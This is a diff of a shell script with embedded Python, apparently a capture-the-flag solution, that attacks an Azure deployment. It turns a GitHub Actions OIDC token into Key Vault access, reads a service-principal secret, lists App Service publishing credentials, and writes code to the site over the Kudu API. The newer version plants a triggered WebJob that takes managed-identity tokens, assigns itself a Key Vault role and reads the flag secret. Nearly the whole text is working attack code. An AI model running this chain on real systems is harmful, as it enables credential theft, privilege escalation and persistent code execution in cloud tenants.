@@ -2,51 +2,23 @@
 set +e
 python3 - <<'PY'
 import base64,json,os,time,urllib.parse,urllib.request,urllib.error
-TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'; SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'; CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'; V='https://kv-tbl-prod-x3euoz.vault.azure.net'; APP='app-tbl-reporting-prod'; RG='rg-tbl-reporting-prod-eus'; ARM='https://management.azure.com'
-def rq(u,m='GET',d=None,h=None,t=30):
+TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e';SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6';CID='72ff278a-9e71-43ec-bac4-2ca303f8e462';V='https://kv-tbl-prod-x3euoz.vault.azure.net';APP='app-tbl-reporting-prod';RG='rg-tbl-reporting-prod-eus'; ARM='https://management.azure.com'
+def rq(u,m='GET',d=None,h=None,t=20):
  try:
-  x=urllib.request.urlopen(urllib.request.Request(u,data=d,method=m,headers=h or {}),timeout=t); return x.status,x.read()
+  x=urllib.request.urlopen(urllib.request.Request(u,data=d,method=m,headers=h or {}),timeout=t);return x.status,x.read()
  except urllib.error.HTTPError as e:return e.code,e.read()
  except Exception as e:return 0,str(e).encode()
-def jq(u,m='GET',o=None,tok='',t=30):
- h={'Content-Type':'application/json'}
- if tok:h['Authorization']='Bearer '+tok
- s,b=rq(u,m,json.dumps(o).encode() if o is not None else None,h,t)
- try:return s,json.loads(b.decode())
- except:return s,{'raw':b.decode(errors='replace')}
-def fq(u,o,t=30):
- s,b=rq(u,'POST',urllib.parse.urlencode(o).encode(),{'Content-Type':'application/x-www-form-urlencoded'},t)
- try:return s,json.loads(b.decode())
- except:return s,{'raw':b.decode(errors='replace')}
-base_oid=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); raw_oid=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN',''); print('oidc_env',bool(base_oid),len(raw_oid),flush=True)
-ou=base_oid+'&audience=api%3A%2F%2FAzureADTokenExchange'; s,b=rq(ou,h={'Authorization':'Bearer '+raw_oid}); print('oidc_req',s,b[:300],flush=True); oid=json.loads(b.decode()).get('value','') if s==200 else ''
-s,d=fq(f'https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token',{'client_id':CID,'grant_type':'client_credentials','scope':'https://vault.azure.net/.default','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':oid}); vt=d.get('access_token',''); print('vault',len(vt),flush=True)
-s,d=jq(V+'/secrets/reporting-service-principal?api-version=7.4',tok=vt); sp=json.loads(d.get('value','{}')) if d.get('value') else {}
-s,d=fq(f'https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token',{'client_id':sp.get('appId',''),'grant_type':'client_credentials','client_secret':sp.get('clientSecret',''),'scope':'https://management.azure.com/.default'}); at=d.get('access_token',''); print('arm',len(at),flush=True)
-u=f'{ARM}/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/{APP}/restart?api-version=2023-01-01'; s,b=rq(u,'POST',b'',{'Authorization':'Bearer '+at},40); print('restart',s,b[:200],flush=True); time.sleep(12)
-u=f'{ARM}/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/{APP}/config/publishingcredentials/list?api-version=2023-01-01'; s,d=jq(u,'POST',{},at,40); p=d.get('properties',{}); ku=p.get('publishingUserName',''); kp=p.get('publishingPassword',''); print('pub',s,bool(ku),len(kp),flush=True)
-if not ku or not kp: raise SystemExit
-worker='''import os,json,urllib.parse,urllib.request,urllib.error\nIE=os.environ.get("IDENTITY_ENDPOINT","http://169.254.131.3:8081/msi/token"); IH=os.environ.get("IDENTITY_HEADER","")\ndef g(u,h={}):\n try:\n  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=20); return r.status,r.read().decode(errors="replace")\n except urllib.error.HTTPError as e:return e.code,e.read().decode(errors="replace")\n except Exception as e:return 0,str(e)\nq=IE+"?resource="+urllib.parse.quote("https://vault.azure.net",safe="")+"&api-version=2019-08-01&client_id=7a85156a-01c4-4e61-8472-40a92107159b"; s,b=g(q,{"X-IDENTITY-HEADER":IH}); print("IDENTITY",s,b[:500])\ntry:t=json.loads(b)["access_token"]\nexcept:t=""\nfor n in ["flag","tbl-flag","config-storage-connection","storage-connection","internal-config"]:\n s,b=g("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/"+n+"?api-version=7.4",{"Authorization":"Bearer "+t}); print("SECRET",n,s,b)\n+'''
-worker=worker.replace('\\n+','\\n').replace('+','')
-worker_lines=[
-"import os,json,urllib.parse,urllib.request,urllib.error",
-"IE=os.environ.get('IDENTITY_ENDPOINT','http://169.254.131.3:8081/msi/token'); IH=os.environ.get('IDENTITY_HEADER',''); OUT='/home/site/wwwroot/flag_result.txt'",
-"def p(*x):",
-" s=' '.join(map(str,x)); print(s,flush=True); open(OUT,'a').write(s+'\\n')",
-"def g(u,h={}):",
-" try:",
-"  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=3); return r.status,r.read().decode(errors='replace')",
-" except urllib.error.HTTPError as e:return e.code,e.read().decode(errors='replace')",
-" except Exception as e:return 0,str(e)",
-"q=IE+'?resource='+urllib.parse.quote('https://vault.azure.net',safe='')+'&api-version=2019-08-01'",
-"q+='&client_id=7a85156a-01c4-4e61-8472-40a92107159b'",
-"s,b=g(q,{'X-IDENTITY-HEADER':IH}); p('IDENTITY',s,b[:500])",
-"try:t=json.loads(b)['access_token']",
-"except:t=''",
-"for n in ['flag','tbl-flag','config-storage-connection','storage-connection','internal-config']:",
-" s,b=g('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/'+n+'?api-version=7.4',{'Authorization':'Bearer '+t}); p('SECRET',n,s,b)",
-]
-worker='\n'.join(worker_lines)
-a=base64.b64encode((ku+':'+kp).encode()).decode(); u=f'https://{APP}.scm.azurewebsites.net/api/vfs/site/wwwroot/readflag.py'; s,b=rq(u,'PUT',worker.encode(),{'Authorization':'Basic '+a,'If-Match':'*'},40); print('vfs',s,b[:200],flush=True)
-cmd=json.dumps({'command':'python3 /home/site/wwwroot/readflag.py','dir':'site/wwwroot'}).encode(); s,b=rq(f'https://{APP}.scm.azurewebsites.net/api/command','POST',cmd,{'Authorization':'Basic '+a,'Content-Type':'application/json'},60); print('command',s,b.decode(errors='replace'),flush=True)
+def form(u,o):
+ s,b=rq(u,'POST',urllib.parse.urlencode(o).encode(),{'Content-Type':'application/x-www-form-urlencoded'});return json.loads(b).get('access_token','')
+def js(u,t,m='GET',o=None):
+ h={'Authorization':'Bearer '+t,'Content-Type':'application/json'};s,b=rq(u,m,json.dumps(o).encode() if o is not None else None,h);return s,b
+oidurl=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience=api%3A%2F%2FAzureADTokenExchange';s,b=rq(oidurl,h={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']});oid=json.loads(b)['value'];vt=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':CID,'grant_type':'client_credentials','scope':'https://vault.azure.net/.default','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':oid});s,b=js(V+'/secrets/reporting-service-principal?api-version=7.4',vt);sp=json.loads(json.loads(b)['value']);at=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':sp['appId'],'grant_type':'client_credentials','client_secret':sp['clientSecret'],'scope':'https://management.azure.com/.default'});s,b=js(ARM+'/subscriptions/'+SUB+'/resourceGroups/'+RG+'/providers/Microsoft.Web/sites/'+APP+'/config/publishingcredentials/list?api-version=2023-01-01',at,'POST',{});p=json.loads(b)['properties'];a=base64.b64encode((p['publishingUserName']+':'+p['publishingPassword']).encode()).decode()
+job='''import base64,json,os,time,uuid,urllib.parse,urllib.request,urllib.error\nTEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e";SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6";CID="7a85156a-01c4-4e61-8472-40a92107159b";OUT="/home/site/wwwroot/App_Data/jobs/triggered/flagjob/result.json"\ndef r(u,h={},d=None,m="GET",t=15):\n try:\n  x=urllib.request.urlopen(urllib.request.Request(u,headers=h,data=d,method=m),timeout=t);return x.status,x.read().decode(errors="replace")\n except urllib.error.HTTPError as e:return e.code,e.read().decode(errors="replace")\n except Exception as e:return 0,repr(e)\ndef tok(res):\n e=os.environ.get("IDENTITY_ENDPOINT") or os.environ.get("MSI_ENDPOINT") or "http://169.254.131.3:8081/msi/token";ih=os.environ.get("IDENTITY_HEADER") or os.environ.get("MSI_SECRET") or "";q=e+"?resource="+urllib.parse.quote(res,safe="")+"&api-version=2019-08-01&client_id="+CID;h={"X-IDENTITY-HEADER":ih} if os.environ.get("IDENTITY_ENDPOINT") else {"Secret":ih};s,b=r(q,h);\n if s!=200: raise RuntimeError("identity "+str(s)+" "+b[:300])\n return json.loads(b)["access_token"]\nout={}\ntry:\n v=tok("https://vault.azure.net");a=tok("https://management.azure.com");p=json.loads(base64.urlsafe_b64decode(v.split(".")[1]+"==").decode());oid=p["oid"];scope="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz";u="https://management.azure.com"+scope+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2022-04-01";body=json.dumps({"properties":{"roleDefinitionId":"/subscriptions/"+SUB+"/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":oid,"principalType":"ServicePrincipal"}}).encode();out["role"]=r(u,{"Authorization":"Bearer "+a,"Content-Type":"application/json"},body,"PUT",20)\n for i in range(20):\n  s,b=r("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4",{"Authorization":"Bearer "+tok("https://vault.azure.net")});out["secret"]=(s,b);\n  if s==200:break\n  time.sleep(3)\nexcept Exception as e:out={"error":repr(e)}\nopen(OUT,"w").write(json.dumps(out))\n'''
+for path,data in [('App_Data/jobs/triggered/flagjob/run.py',job),('App_Data/jobs/triggered/flagjob/settings.job','{}')]:
+ s,b=rq('https://'+APP+'.scm.azurewebsites.net/api/vfs/site/wwwroot/'+path,'PUT',data.encode(),{'Authorization':'Basic '+a,'If-Match':'*'},40);print('put',path,s,flush=True)
+s,b=rq('https://'+APP+'.scm.azurewebsites.net/api/triggeredwebjobs/flagjob/run','POST',b'',{'Authorization':'Basic '+a},40);print('trigger',s,b[:200],flush=True)
+for i in range(24):
+ s,b=rq('https://'+APP+'.scm.azurewebsites.net/api/vfs/site/wwwroot/App_Data/jobs/triggered/flagjob/result.json','GET',None,{'Authorization':'Basic '+a},10);print('result',i,s,b[:500],flush=True)
+ if b'DF26{' in b:break
+ time.sleep(5)
 PY
